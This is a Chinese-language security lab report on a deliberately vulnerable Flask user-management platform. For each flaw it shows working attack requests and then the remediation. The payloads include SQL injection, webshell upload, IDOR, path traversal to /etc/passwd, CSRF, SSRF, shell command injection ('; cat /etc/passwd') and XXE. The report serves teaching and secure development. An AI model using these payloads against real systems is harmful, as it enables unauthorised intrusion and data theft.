1  实训概述
本次实训以本人设计开发的 Simple User Management Platform 为靶标项目，围绕常见的 Web 安全漏洞类型展开系统性实践。项目采用 Python Flask 框架构建，功能涵盖用户登录注册、信息查询、个人资料管理、充值、头像上传、URL 抓取、Ping 网络诊断和 XML 数据导入等真实业务场景。
实训方法论遵循"构建漏洞场景 → 复现攻击 → 分析根因 → 实施修复 → 回归验证"的完整闭环。每个专项均保留 Git 提交历史作为过程证据，依次为 feat（构建漏洞场景）、docs（撰写检测报告）、fix（完成安全加固）。两个分支（vulnerable 和 main）分别保存漏洞版本和修复版本，便于对比学习。
实训目标：
理解 OWASP Top 10 中常见 Web 漏洞的产生原理与利用方式
掌握使用 Burp Suite、curl 等工具进行安全测试的方法
学会从代码层面分析漏洞根因并实施有效修复
建立安全开发生命周期（SSDLC）的工程化思维
培养撰写规范化安全报告的技术文档能力

3  实训内容与成果
3.1  基础认证与配置安全审计
本次实训首先对平台的基础认证机制和启动配置进行安全审计。包括登录认证绕过、Session 安全配置、调试模式暴露、CSRF 防护缺失等问题。
主要发现：
密码明文存储（USERS 字典中直接存储 admin123、alice2025）
密钥硬编码（secret_key = "dev-key-2025"）
Debug 模式默认开启，暴露 Werkzeug 调试器
Session Cookie 无 SameSite、Secure 属性
登录页面 HTML 注释泄露默认凭据
修复措施：
使用 werkzeug.security.generate_password_hash 进行密码哈希
secret_key 从环境变量获取，运行时随机生成 fallback
Debug 模式由环境变量 DEBUG 控制，默认关闭
配置 SESSION_COOKIE_HTTPONLY、SameSite=Lax
移除硬编码凭据的 HTML 注释
3.2  SQL 注入漏洞
登录、注册和搜索三个接口均使用 f-string 拼接 SQL 语句，未做任何输入过滤或参数化处理。攻击者可通过注入恶意 SQL 绕过认证、脱取数据库、插入后门数据。
攻击验证：
UNION 注入脱取全量用户凭据
GET /search?keyword=' UNION SELECT id,username,password,email,phone FROM users --
返回: admin/admin123, alice/alice2025 等明文密码

布尔盲注逐字提取密码
GET /search?keyword=admin' AND (SELECT unicode(substr(password,1,1)) FROM users
     WHERE username='admin')=97 --
条件为真时显示admin，为假时显示[无搜索结果]
修复措施：
使用 SQLite 参数化查询（? 占位符）替代 f-string 拼接
搜索接口 SELECT 语句不返回 password 字段
3.3  任意文件上传漏洞
头像上传功能未对文件类型做任何校验，允许上传任意文件到 static/uploads/ 目录，且使用用户提供的原始文件名保存，存在文件覆盖风险。
攻击验证：
上传 PHP webshell
curl -b cookies.txt -F "avatar=@shell.php" http://target.com/upload
上传 .htaccess
curl -b cookies.txt -F "avatar=@.htaccess;filename=.htaccess" http://target.com/upload
✅ 全部上传成功，文件可公开访问
修复措施：
图片扩展名白名单（png/jpg/jpeg/gif/webp）
UUID 重命名，防止覆盖和可预测文件名
imghdr 验证文件内容是否为有效图片
上传目录移至 static/ 外部，通过认证路由提供访问
将 MAX_CONTENT_LENGTH 从 16MB 降至 2MB
3.4  IDOR 越权与充值逻辑漏洞
个人中心接口 /profile 和充值接口 /recharge 均通过 URL/表单参数指定目标用户，未验证当前登录用户与操作目标的一致性，导致任意用户可越权查看他人资料或修改他人余额。
攻击验证：
alice 查看 admin 资料
curl -b cookies.txt "http://target.com/profile?user_id=1"
✅ 返回 admin 完整信息（邮箱、手机、余额）

alice 为 admin 充值 500 元
curl -b cookies.txt -d "user_id=1&amount=500" http://target.com/recharge
✅ admin 余额从 99999 → 100499

负金额扣款
curl -b cookies.txt -d "user_id=2&amount=-1000" http://target.com/recharge
✅ alice 余额从 100 → -900 (透支)
修复措施：
profile 接口校验当前用户 ID 与请求的 user_id 一致
recharge 接口仅允许给自己充值
金额必须大于 0，单次充值上限 100,000 元
余额上限 999,999 元

3.5  LFI 路径遍历漏洞
动态页面加载功能 /page 直接拼接用户输入的 name 参数到文件路径，未对 ../ 路径穿越符做任何过滤。攻击者可读取服务器任意文件。
攻击验证：
GET /page?name=../app.py
✅ 返回 app.py 源代码
GET /page?name=../../etc/passwd
✅ 返回系统用户列表
修复措施：
路径规范化（os.path.abspath + os.path.realpath）
限定文件只能从 pages/ 目录读取
3.6  CSRF 跨站请求伪造
所有 POST 接口均未实施 CSRF 防护，攻击者可构造恶意页面，当已登录用户访问时自动提交恶意请求。
攻击验证：
跨站修改密码（从任意 Origin）
curl -b cookies.txt -d "username=admin&new_password=hacked123" \
  -H "Origin: https://evil.com" http://target.com/change-password
✅ admin 密码被修改为 hacked123

跨站充值
curl -b cookies.txt -d "user_id=2&amount=99999" \
  -H "Origin: https://evil.net" http://target.com/recharge
✅ 充值成功
修复措施：
集成 flask-wtf CSRFProtect，所有表单添加 Token 校验
设置 SESSION_COOKIE_SAMESITE = "Lax"
修改密码等敏感操作要求验证原密码
3.7  SSRF 服务端请求伪造
URL 抓取功能未限制 URL 协议和目标 IP，支持 file://、dict:// 等协议，可访问 127.0.0.1 和 10.x.x.x 内网地址。
攻击验证：
读取本地文件
curl -b cookies.txt -d "url=file:///etc/passwd" http://target.com/fetch-url
✅ 返回 /etc/passwd 文件内容

SSRF 访问内网服务
curl -b cookies.txt -d "url=http://127.0.0.1:5000/admin" http://target.com/fetch-url
✅ 成功访问本机 5000 端口的内部功能
修复措施：
URL 协议白名单（仅允许 http/https）
阻止内网地址（127.0.0.1、10.x.x.x、172.16.x.x、192.168.x.x）
限制返回内容大小，避免内存耗尽
3.8  命令注入漏洞
Ping 网络诊断功能使用 f-string 拼接系统命令并设置 shell=True，攻击者可通过分号、管道符、逻辑运算符注入任意系统命令。
攻击验证：
分号注入执行系统命令
curl -b cookies.txt --data-urlencode "ip=127.0.0.1; id" http://target.com/ping
✅ 返回: uid=0(root) gid=0(root)

管道符注入
curl -b cookies.txt --data-urlencode "ip=127.0.0.1 | whoami" http://target.com/ping
✅ 返回: root

读取文件
curl -b cookies.txt --data-urlencode "ip=127.0.0.1; cat /etc/passwd" http://target.com/ping
✅ 返回系统用户列表
修复措施：
禁用 shell=True，使用参数数组形式执行命令
IP 地址白名单校验（ipaddress.ip_address()）
正则限制仅允许数字和点号
3.9  XXE 外部实体注入
XML 数据导入功能通过正则提取 <!ENTITY 定义中的 SYSTEM 路径后直接 open() 读取文件，不做任何路径校验。XML 解析器默认允许外部实体解析。
攻击验证：
XXE 文件读取
xml_data='<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><user><name>&xxe;</name></user></root>'
curl -b cookies.txt --data-urlencode "xml_data=$xml_data" http://target.com/xml-import
✅ 返回主机名

SSRF 型 XXE 扫描内网
<!ENTITY xxe SYSTEM "http://127.0.0.1:5000/">
✅ 返回内网 Web 页面内容
修复措施：
使用 defusedxml 替代 xml.etree.ElementTree
禁用 DTD / 外部实体解析
限制实体扩展次数防 Billion Laughs 攻击

6  实训总结与收获
6.1  技术收获
通过本次实训，深入理解了 Web 安全中"输入即攻击面"的核心原则。从 SQL 注入到 XXE，所有漏洞的本质都是将用户可控的数据传递到高风险解释器（SQL 引擎、操作系统 Shell、XML 解析器、文件系统路径等），而未做充分的边界校验。
实训中实践了多种漏洞利用技术：UNION 注入数据脱取、布尔盲注逐字符提取、联合文件上传与命令注入的权限提升链、SSRF 内网横向移动、XXE 文件读取与 OOB 数据外传等。这些技术让我对攻击链条有了更完整的认识。
6.2  安全开发思维
从"先写功能再修安全"到"设计时即考虑安全"的思维转变是本次实训最大的收获。通过在 main 分支上实施迭代修复并追踪 Git 历史，深刻体会到：
安全左移：在需求阶段就定义安全验收标准
纵深防御：单一防护手段不够，需要多层安全机制叠加
最小权限：运行进程、数据库账户、功能权限都应遵循最小化原则
默认安全：框架默认配置往往不安全，需要主动加固
可追溯性：Git 提交 + 漏洞报告形成完整的证据链
6.3  工具与方法论
掌握了从浏览器开发者工具到 Burp Suite 再到 curl 命令行的分层测试方法。学会了使用 python-docx 批量生成规范化安全报告，使用 Git 分支管理漏洞版与修复版代码的对比。方法论上建立了"场景搭建 → 漏洞复现 → 原因分析 → 修复加固 → 回归验证"的闭环流程，这套流程可复用于未来任何 Web 项目的安全评估。
6.4  未来展望
本次实训覆盖了 OWASP Top 10 中的大部分 Web 漏洞类型，但仍有改进空间：可进一步扩展的方面包括自动化安全测试集成（SAST/DAST）、持续安全监控、容器化部署安全、API 安全等方面的实践。希望将本次实训的经验应用到未来的开发工作中，建立更完善的安全开发生命周期。
